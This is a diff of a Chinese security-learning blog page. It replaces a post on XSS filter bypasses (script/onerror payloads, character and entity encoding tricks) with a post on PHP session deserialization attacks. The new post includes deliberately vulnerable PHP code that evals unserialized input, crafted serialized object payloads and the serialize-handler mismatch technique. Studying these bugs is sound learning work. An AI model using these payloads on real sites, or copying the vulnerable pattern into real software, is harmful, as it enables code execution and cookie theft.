@@ -120,87 +120,111 @@
     
 <article id="post">
   <div class="post-page-title"  style="background-color:#00e699;background-image:url(/images/random/vateral-9.png)" >
-  <h2>xss学习</h2>
+  <h2>php session反序列化漏洞学习</h2>
     
-  <p>作者: &nbsp&nbsp 发布于:<time datetime="2018-05-10T13:19:07.000Z">
-          2018-05-10
+  <p>作者: &nbsp&nbsp 发布于:<time datetime="2018-11-28T08:20:30.000Z">
+          2018-11-28
     </time>
   </p>
     
   </div>
   <div class="post-page-content">
-  <p>构造xss有三大对手：正则，转义，标记</p>
-<hr>
-<h3 id="其一-emsp-攻击原理"><a href="#其一-emsp-攻击原理" class="headerlink" title="其一 &emsp; 攻击原理:"></a>其一 &emsp; 攻击原理:</h3><p>1.将带有xss的HTTP链接给用户（或该网页已被xss攻击，形成特有漏洞页面），用户登陆时网站执行xss脚本，攻击者获取用户信息（cookie等）</p>
-<p>2.构造xss跨站漏洞页面<br><img src="http://upload-images.jianshu.io/upload_images/9233083-307cd6c96c65bed9.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="xss分类"><br>3.<em>基本套路：</em></p>
-<pre><code>&lt;script&gt;alert(xss)&lt;/script&gt;                 //正面直接刚
-&lt;img src=&quot; &quot;  onerror=&quot;&quot;&gt;                  //onerror事件
-“&gt;&lt;...........&gt;&lt;&quot;                            //闭合前后标签
-background-image:url(javascript:........)      //这个style很不一样哦
-</code></pre><h3 id="其二-emsp-关键词过滤："><a href="#其二-emsp-关键词过滤：" class="headerlink" title="其二 &emsp;关键词过滤："></a>其二 &emsp;关键词过滤：</h3><table>
+  <h2 id="测试反序列化漏洞"><a href="#测试反序列化漏洞" class="headerlink" title="测试反序列化漏洞"></a>测试反序列化漏洞</h2><blockquote>
+<p>反序列化漏洞存在的原因就是很多就是未正确处理需要反序列化的数据</p>
+</blockquote>
+<p>php源码</p>
+<pre><code>&lt;?php
+    class test{
+     var $poc=&quot;&quot;;
+     function __construct() {  //__construct()　　- 在每次创建新对象时先调用此方法
+      $this-&gt;poc = &quot;phpinfo()&quot;;
+     }
+     function __wakeup(){
+      eval($this-&gt;poc);
+     }
+
+     /*function __destruct(){
+      * eval($this-&gt;poc);              
+      * }//这里的__destruct方法也可以执行，PHP 析构方法 __destruct() 允许在销毁一个类之前执行执行析构方法。
+     */
+
+    }
+    unserialize($_GET[&apos;my&apos;]);
+?&gt;
+</code></pre><p>当输入</p>
+<pre><code>O:4:&quot;test&quot;:1:{s:3:&quot;poc&quot;;s:11:&quot;echo &quot;poc&quot;;&quot;;}
+</code></pre><p>可以发现实例化了test对象，达到任何命令执行的目的<br><img src="https://i.imgur.com/yw0Z1VV.png" alt=""></p>
+<p>当然真实环境下的反序列化漏洞不可能这么简单</p>
+<h2 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h2><p>PHP的session存储的内容有三种格式序列化</p>
+<table>
 <thead>
 <tr>
-<th style="text-align:left">关键词</th>
-<th style="text-align:center">过滤手段</th>
-<th style="text-align:center">绕过方法</th>
+<th style="text-align:center">名字</th>
+<th style="text-align:center">存取方式</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td style="text-align:left">script</td>
-<td style="text-align:center">过滤小写</td>
-<td style="text-align:center">大小写混写script</td>
+<td style="text-align:center">php</td>
+<td style="text-align:center">键名+竖线+经过serialize()函数序列处理的值</td>
 </tr>
 <tr>
-<td style="text-align:left">script</td>
-<td style="text-align:center">过滤大小写</td>
-<td style="text-align:center">嵌套script标签绕过</td>
+<td style="text-align:center">php_serialize(php&gt;5.5.4)</td>
+<td style="text-align:center">经过serialize()函数序列化处理的值</td>
 </tr>
 <tr>
-<td style="text-align:left">script</td>
-<td style="text-align:center">含有script关键词直接die</td>
-<td style="text-align:center">用img标签的onerror报错执行脚本</td>
-</tr>
-<tr>
-<td style="text-align:left">script</td>
-<td style="text-align:center">…</td>
-<td style="text-align:center">ſcript这个词居然可以解析成script，然后绕过script的过滤</td>
-</tr>
-<tr>
-<td style="text-align:left">alert(‘xss’)</td>
-<td style="text-align:center">编码绕过</td>
-<td style="text-align:center"><code>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 120, 115, 115, 39, 41))</code></td>
+<td style="text-align:center">php_binary</td>
+<td style="text-align:center">键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</td>
 </tr>
 </tbody>
 </table>
-<p>&emsp;&emsp;JS中的编码还原函数最常用的就是String.fromCharCode了，这个函数用于ascii码的还原，这个函数都要配合EVAL来使用才有效果。<br>这个的使用原理是先编码绕过过滤然后再还原</p>
-<h3 id="其三-emsp-字符编码"><a href="#其三-emsp-字符编码" class="headerlink" title="其三 &emsp;字符编码"></a>其三 &emsp;字符编码</h3><p>&emsp;&emsp;之前看各种xss的注入姿势就对字符编码产生了超级大的疑惑，留下不学无术的眼泪。一下就是我的问题：</p>
-<ol>
-<li>url编码，ASCII这些都是什么鬼</li>
-<li>什么时候能用，什么时候不能用(╯▔皿▔)╯</li>
-<li>哪些位置要用哪些编码</li>
-</ol>
-<hr>
-<p>主要的编码：</p>
-<ol>
-<li>url编码</li>
-</ol>
-<p>&emsp;&emsp;url编码是给浏览器解析用的</p>
-<ol start="2">
-<li>Unicode编码</li>
-<li>HTML编码</li>
-</ol>
-<p>&emsp;&emsp;html实体编码本身存在的意义是防止与HTML本身语义标记的冲突<strong>。html标签中识别html实体编码，并且会在html页面加载时会对编码进行解码</strong>。而使用这个编码的目的是为了在构造html标签，（<strong>浏览器是不会在html标签里解析js中的那些编码</strong>）<br>编码过后</p>
-<pre><code>&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;
-</code></pre><p>原code：</p>
-<pre><code>&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;
-</code></pre><p>除此之外，换行符也可以帮助绕过一些字符如：javascript过滤，可以用<code>javasc&amp;NewLine;ript</code>绕过</p>
-<pre><code>&amp;colon; =&gt; [冒号]
-&amp;NewLine; =&gt; [换行]
-</code></pre><p>不要怀疑这样有没得用，浏览器中的解析器中词法分析器起的作用会跳过空白跟换行之类的无效字符。</p>
-<ol start="4">
-<li>base64编码</li>
-</ol>
+<p>存储方式就是由配置项session.save_handler来进行确定的，默认是以文件（FILE）的方式存储。</p>
+<p>举个栗子：<br>输入：</p>
+<pre><code>|O:9:&quot;mysession&quot;:0:{}
+</code></pre><p>存入session中的值为</p>
+<pre><code>php引擎中session
+键名|s:21:&quot;|O:9:&quot;mysession&quot;:0:{}&quot;;
+
+php_serialize引擎中session
+a:1:{s:键名的长度:&quot;键名&quot;;s:21:&quot;|O:9:&quot;mysession&quot;:0:{}&quot;;}
+
+php_binary引擎中session
+键名s:21:&quot;|O:9:&quot;mysession&quot;:0:{}&quot;;
+</code></pre><p>由于不同序列化引擎处理同一个数据的方式不同，所以我们可以在两个配置引擎不同的环境下进行操作</p>
+<h4 id="用户可控session的情况下"><a href="#用户可控session的情况下" class="headerlink" title="用户可控session的情况下"></a>用户可控session的情况下</h4><p>（为了方便理解这个原理我直接通过get来设置session）</p>
+<p>session0.php源码</p>
+<pre><code>&lt;?php
+ini_set(&quot;session.serialize_handler&quot;,&quot;php_serialize&quot;);
+session_start();
+$_SESSION[&apos;my&apos;] = $_GET[&apos;my&apos;];
+?&gt;
+</code></pre><p>可以看到我将第一个序列化引擎设置为<code>php_serialize</code><br>将<code>|O:4:&quot;test&quot;:1:{s:3:&quot;poc&quot;;s:13:&quot;echo &quot;poccc&quot;;&quot;;}</code>置入到session中<br>那么session中存在的应该是</p>
+<pre><code>a:1:{s:2:&quot;my&quot;;s:47:&quot;|O:4:&quot;test&quot;:1:{s:3:&quot;poc&quot;;s:12:&quot;echo &quot;poccc&quot;;&quot;;}&quot;;}
+</code></pre><p>可以看到的是由于认为添加了<code>|</code>符号将整个session前半部分和后半部分。当再用php序列化引擎取解析这个session时会把前半部分当作键名，后半部分当作键值，反序列化的结果用<code>var_dump</code>输出就是</p>
+<pre><code>object(test)#1 (1) { [&quot;poc&quot;]=&gt; string(11) &quot;echo &quot;poc&quot;;&quot; }
+</code></pre><p>此时我们拿着这个session取访问session1.php时</p>
+<p>session1.php源码</p>
+<pre><code>&lt;?php
+ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);
+session_start();
+class test{
+ var $poc=&quot;&quot;;
+ function __construct() {
+  $this-&gt;poc = &quot;phpinfo()&quot;;       
+ }
+ function __destruct(){
+  eval($this-&gt;poc);
+  var_dump($_SESSION);
+ }
+}
+?&gt;
+</code></pre><p>可以把<code>a:1:{s:2:&quot;my&quot;;s:45:&quot;</code>当着键名看到依旧成功实例化了test对象</p>
+<p><img src="https://i.imgur.com/N7b7zgJ.png" alt=""></p>
+<p>注意</p>
+<p>php5.6.13版本以前是第一个变量解析错误注销第一个变量，然后解析第二个变量，但是5.6.13以后如果第一个变量错误，直接销毁整个session</p>
+<h4 id="需要注入session的情况"><a href="#需要注入session的情况" class="headerlink" title="需要注入session的情况"></a>需要注入session的情况</h4><p>当session.upload_progress.enabled打开时，php会记录上传文件的进度，在上传时会将其信息保存在$_SESSION中，这就达到了我们注入session的目的</p>
+<p><a href="https://bugs.php.net/bug.php?id=71101" target="_blank" rel="noopener">bugs.php.net上的具体信息</a></p>
+<p>jarvisoj练习平台的题phpinfo利用的就是这个，值得注意的是这里的<code>session.upload_progress.cleanup</code>关闭了可以直接写入信息，若是设置这个参数为ON，那么需要上传large and crash文件，来使得我们传入的信息得以执行。</p>
 
   </div>
   <!--评论块-->
@@ -210,15 +234,11 @@ background-image:url(javascript:........)      //这个style很不一样哦
 <nav class="post-nav">
   <!-- Prev Nav -->
     
-  <a href="/2018/09/23/tcp，udp简单编程/" id="post_nav-newer" class="post-nav-content prev-content">
-      新篇
-  </a>
-    
 
 
   <!-- Next Nav -->
     
-  <a href="/2018/05/09/可爱的段誉/" id="post_nav-older" class="post-nav-content next-content">
+  <a href="/2018/11/14/XXE漏洞学习/" id="post_nav-older" class="post-nav-content next-content">
       旧篇
   </a>
     
@@ -226,7 +246,7 @@ background-image:url(javascript:........)      //这个style很不一样哦
 <div class="post-toc-btn"><i class="material-icons">format_list_numbered</i></div>
 <div class="post-toc-none"><p>(无)</p></div>
 <div class="post-toc-box">
-    <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#其一-emsp-攻击原理"><span class="post-toc-number">1.</span> <span class="post-toc-text">其一   攻击原理:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#其二-emsp-关键词过滤："><span class="post-toc-number">2.</span> <span class="post-toc-text">其二  关键词过滤：</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#其三-emsp-字符编码"><span class="post-toc-number">3.</span> <span class="post-toc-text">其三  字符编码</span></a></li></ol>
+    <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#测试反序列化漏洞"><span class="post-toc-number">1.</span> <span class="post-toc-text">测试反序列化漏洞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#session反序列化漏洞"><span class="post-toc-number">2.</span> <span class="post-toc-text">session反序列化漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#用户可控session的情况下"><span class="post-toc-number">2.0.1.</span> <span class="post-toc-text">用户可控session的情况下</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#需要注入session的情况"><span class="post-toc-number">2.0.2.</span> <span class="post-toc-text">需要注入session的情况</span></a></li></ol></li></ol></li></ol>
 </div>
 <!--<div class="post-back"><i class="material-icons">arrow_back</i></div>-->
 <script type="text/javascript">
